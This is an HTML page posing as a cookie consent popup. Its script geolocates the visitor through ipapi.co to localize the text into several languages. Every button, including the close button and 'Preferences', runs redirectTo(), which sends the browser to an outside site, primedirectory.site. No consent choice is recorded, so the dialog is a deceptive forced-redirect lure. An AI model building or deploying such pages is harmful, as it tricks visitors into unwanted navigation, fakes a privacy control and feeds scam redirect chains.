  <title>Cookie Constant</title>
   <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #E3DED7 0%, #f8f4f0 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center; 
    }
    
    .main-content {
     position: relative;
    width: 100%;
    height: 100vh;
    margin: 0;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    }
    
    .section-1 {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      z-index: 1;
    }
    
    .cookie-popup {
      position: relative;
      z-index: 2;
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
      max-width: 450px;
      width: 100%;
      overflow: hidden;
      border: 1px solid rgba(227, 222, 215, 0.5);
    }
    
    .cookie-header {
      background: #E3DED7;
      padding: 20px 24px 16px;
      text-align: center;
      position: relative;
    }
    
    .cookie-close {
      position: absolute;
          top: 16px;
      right: 8px;
      background: rgba(0, 0, 0, 0.1);
      border: none;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      font-size: 20px;
      cursor: pointer;
      color: #333;
    }
    
    .cookie-title {
      color: #000;
      font-size: 24px;
      font-weight: 600;
      margin: 0;
    }
    
    .cookie-body {
      padding: 24px;
      text-align: center;
    }
    
    .cookie-text {
      color: #444;
      font-size: 16px;
      line-height: 1.6;
      margin-bottom: 24px;
    }
    
    .cookie-buttons {
      display: flex;
      gap: 12px;
      justify-content: center;
      align-items: center;
    }
    
    .btn {
      padding: 14px 28px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      flex: 1;
      max-width: 180px;
    }
    
    .btn-accept {
      background: #000;
      color: white;
    }
    
    .btn-settings {
      background: transparent;
      color: #000;
      border: 2px solid #000;
    }
    
    @media (max-width: 480px) {
      .cookie-buttons {
        flex-direction: column;
      }
      
      .cookie-popup {
        margin: 20px;
        max-width: none;
      }
    }
  </style>
</head>
<body>
  <div class="main-content">
    <div class="section-1"></div>
    
    <div class="cookie-popup">
      <div class="cookie-header">
        <button class="cookie-close" onclick="redirectTo()">&times;</button>
        <h2 class="cookie-title">Cookie Constant</h2>
      </div>
      <div class="cookie-body">
        <p class="cookie-text" id="cookie-text">
          This site uses cookies to improve performance and deliver better results for users.

        </p>
        <div class="cookie-buttons">
          <button class="btn btn-accept" id="accept-button" onclick="redirectTo()">Accept All</button>
          <button class="btn btn-settings" id="settings-button" onclick="redirectTo()">Preferences</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    const countryContent = {
      AU: {
        language: "en-AU",
        title: "Cookie preferences",
        text: "We use cookies to improve performance and deliver a better experience for visitors in Australia.",
        accept: "Accept all",
        settings: "Cookie settings"
      },
      PL: {
        language: "pl-PL",
        title: "Preferencje dotyczące plików cookie",
        text: "Używamy plików cookie, aby poprawić wydajność i zapewnić użytkownikom lepsze doświadczenia w Polsce.",
        accept: "Akceptuj wszystkie",
        settings: "Ustawienia plików cookie"
      },
      DE: {
        language: "de-DE",
        title: "Cookie-Einstellungen",
        text: "Wir verwenden Cookies, um die Leistung zu verbessern und Besuchern in Deutschland ein besseres Erlebnis zu bieten.",
        accept: "Alle akzeptieren",
        settings: "Cookie-Einstellungen"
      },
      DK: {
        language: "da-DK",
        title: "Cookie-indstillinger",
        text: "Vi bruger cookies til at forbedre ydeevnen og give besøgende i Danmark en bedre oplevelse.",
        accept: "Acceptér alle",
        settings: "Cookie-indstillinger"
      },
      PT: {
        language: "pt-PT",
        title: "Preferências de cookies",
        text: "Utilizamos cookies para melhorar o desempenho e proporcionar uma experiência melhor aos visitantes em Portugal.",
        accept: "Aceitar todos",
        settings: "Definições de cookies"
      },
      HU: {
        language: "hu-HU",
        title: "Cookie-beállítások",
        text: "Cookie-kat használunk a teljesítmény javítására és a magyarországi látogatók jobb élményének biztosítására.",
        accept: "Összes elfogadása",
        settings: "Cookie-beállítások"
      },
      IT: {
        language: "it-IT",
        title: "Preferenze sui cookie",
        text: "Utilizziamo i cookie per migliorare le prestazioni e offrire un'esperienza migliore ai visitatori in Italia.",
        accept: "Accetta tutti",
        settings: "Impostazioni dei cookie"
      },
      NO: {
        language: "nb-NO",
        title: "Innstillinger for informasjonskapsler",
        text: "Vi bruker informasjonskapsler for å forbedre ytelsen og gi besøkende i Norge en bedre opplevelse.",
        accept: "Godta alle",
        settings: "Innstillinger for informasjonskapsler"
      },
      GB: {
        language: "en-GB",
        title: "Cookie preferences",
        text: "We use cookies to improve performance and deliver a better experience for visitors in the United Kingdom.",
        accept: "Accept all",
        settings: "Cookie settings"
      },
      IN: {
        language: "en-IN",
        title: "Cookie preferences",
        text: "We use cookies to improve performance and provide a better experience for visitors in India.",
        accept: "Accept all",
        settings: "Cookie settings"
      },
      US: {
        language: "en-US",
        title: "Cookie preferences",
        text: "We use cookies to improve performance and provide a better experience for visitors in the United States.",
        accept: "Accept all",
        settings: "Cookie settings"
      }
    };

    function applyCountryContent(countryCode) {
      const content = countryContent[countryCode];

      if (!content) {
        return;
      }

      document.documentElement.lang = content.language;
      document.querySelector(".cookie-title").textContent = content.title;
      document.getElementById("cookie-text").textContent = content.text;
      document.getElementById("accept-button").textContent = content.accept;
      document.getElementById("settings-button").textContent = content.settings;
    }

    async function detectCountry() {
      try {
        const response = await fetch("https://ipapi.co/json/", {
          headers: { Accept: "application/json" }
        });

        if (!response.ok) {
          throw new Error("Country lookup failed");
        }

        const location = await response.json();
        applyCountryContent((location.country_code || "").toUpperCase());
      } catch (error) {
        const browserCountry = (navigator.language || "").split(/[-_]/)[1];
        applyCountryContent(browserCountry);
      }
    }

    function redirectTo() {
      window.location.href = "https://primedirectory.site/";
    }

    detectCountry();
  </script>
</body>
